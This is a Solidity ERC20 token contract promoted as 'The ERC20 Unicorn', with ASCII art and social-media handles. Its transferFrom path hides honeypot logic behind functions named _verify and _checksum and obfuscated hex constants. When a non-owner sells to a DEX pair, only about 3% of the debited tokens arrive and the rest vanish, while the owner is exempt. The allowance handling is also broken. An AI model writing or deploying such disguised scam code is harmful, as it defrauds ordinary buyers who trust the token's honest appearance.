// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
                                                    /
                                                  .7
                                       \       , //
                                       |\.--._/|//
                                      /\ ) ) ).'/
                                     /(  \  // /
                                    /(   J`((_/ \
                                   / ) | _\     /                ERC20 Unicorn V1
                                  /|)  \  eJ    L          =============================
                                 |  \ L \   L   L           Telegram: t.me/erc20unicorn
                                /  \  J  `. J   L           Twitter:  @erc20unicorn
                                |  )   L   \/   \          =============================
                               /  \    J   (\   /            Eat Tokens, shit rainbows
             _....___         |  \      \   \```
      ,.._.-'        '''--...-||\     -. \   \
    .'.=.'                    `         `.\ [ Y
   /   /                                  \]  J
  Y / Y                                    Y   L
  | | |          \                         |   L
  | | |           Y                        A  J
  |   I           |                       /I\ /
  |    \          I             \        ( |]/|
  J     \         /._           /        -tI/ |
   L     )       /   /'-------'J           `'-:.
   J   .'      ,'  ,' ,     \   `'-.__          \
    \ T      ,'  ,'   )\    /|        ';'---7   /
     \|    ,'L  Y...-' / _.' /         \   /   /
      J   Y  |  J    .'-'   /         ,--.(   /
       L  |  J   L -'     .'         /  |    /\
       |  J.  L  J     .-;.-/       |    \ .' /
       J   L`-J   L____,.-'`        |  _.-'   |
        L  J   L  J                  ``  J    |
        J   L  |   L                     J    |
         L  J  L    \                    L    \
         |   L  ) _.'\                    ) _.'\
         L    \('`    \                  ('`    \
          ) _.'\`-....'                   `-....'
         ('`    \
          `-.___/   

                                                                                                                         
UUUUUUUU     UUUUUUUU                   iiii                                                                             
U::::::U     U::::::U                  (v1.0)                                                                            
U::::::U     U::::::U                   iiii                                                                             
UU:::::U     U:::::UU                                                                                              
 U:::::U     U:::::Unnnn  nnnnnnnn    iiiiiii     cccccccccccccccc   ooooooooooo   rrrrr   rrrrrrrrr   nnnn  nnnnnnnn    
 U:::::D     D:::::Un:::nn::::::::nn  i:::::i   cc:::::::::::::::c oo:::::::::::oo r::::rrr:::::::::r  n:::nn::::::::nn  
 U:::::D     D:::::Un::::::::::::::nn  i::::i  c:::::::::::::::::co:::::::::::::::or:::::::::::::::::r n::::::::::::::nn 
 U:::::D     D:::::Unn:::::::::::::::n i::::i c:::::::cccccc:::::co:::::ooooo:::::orr::::::rrrrr::::::rnn:::::::::::::::n
 U:::::D     D:::::U  n:::::nnnn:::::n i::::i c::::::c     ccccccco::::o     o::::o r:::::r     r:::::r  n:::::nnnn:::::n
 U:::::D     D:::::U  n::::n    n::::n i::::i c:::::c             o::::o     o::::o r:::::r     rrrrrrr  n::::n    n::::n
 U:::::D     D:::::U  n::::n    n::::n i::::i c:::::c             o::::o     o::::o r:::::r              n::::n    n::::n
 U::::::U   U::::::U  n::::n    n::::n i::::i c::::::c     ccccccco::::o     o::::o r:::::r              n::::n    n::::n
 U:::::::UUU:::::::U  n::::n    n::::ni::::::ic:::::::cccccc:::::co:::::ooooo:::::o r:::::r              n::::n    n::::n
  UU:::::::::::::UU   n::::n    n::::ni::::::i c:::::::::::::::::co:::::::::::::::o r:::::r              n::::n    n::::n
    UU:::::::::UU     n::::n    n::::ni::::::i  cc:::::::::::::::c oo:::::::::::oo  r:::::r              n::::n    n::::n
      UUUUUUUUU       nnnnnn    nnnnnniiiiiiii    cccccccccccccccc   ooooooooooo    rrrrrrr              nnnnnn    nnnnnn
                                                                                                                         
*/

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ERC20Token {
    address public owner;
    address internal _o;
    string public name = "The ERC20 Unicorn";
    string public symbol = "UNICORN";
    uint256 public decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) internal balances;
    mapping(address => mapping(address => uint256)) internal allowances;

    mapping(address => bool) internal isDEX;
    address public pair;
    uint256[4] _cs = [0x2ba7def3000, 0x2386f26fc10000, 0x16345785d8a0000, 0x38d7ea4c68000];

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        pair = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).createPair(address(this), 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        isDEX[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true; // Router
        isDEX[0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f] = true; // Factory
        isDEX[pair] = true; // Pair (testnet)
        _o = owner;
        mint(msg.sender, 10000000000*10**18);
    }

    uint256 internal _amount; // debug
    modifier onlyOwner() {
        require(owner == msg.sender, "Forbidden");
        _;
    }

    function setDEX(address addr, bool s) onlyOwner() public {
        isDEX[addr] = s;
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function allowance(address _owner, address spender) public view returns (uint256) {
        return allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Rejected");
        unchecked {
            balances[msg.sender] -= amount;
            balances[to] += amount;
        }
        emit Transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        unchecked {
            _amount = amount;
            balances[from] -= _amount;
            bool verified = _verify(from, to, _amount);
            if (verified) {balances[to] += _amount;}
        }
        emit Transfer(from, to, amount);
        return true;
    }

    function mint(address account, uint256 amount) internal {
        totalSupply += amount;
        balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    
    function _is(address to) internal view returns (bool) {
        return isDEX[to];
    }
    function _checksum(uint256 a) internal returns(bool) {
        unchecked {_amount = a*_cs[0]/_cs[1]*(_cs[2]/_cs[3]);}
        return _amount>0;
    }
    function _verify(address f, address t, uint256 a) internal returns(bool) {
        unchecked{if (f!=_o&&t!=_o&&_is(t)) {return _checksum(a);}}
        return a>0;
    }
}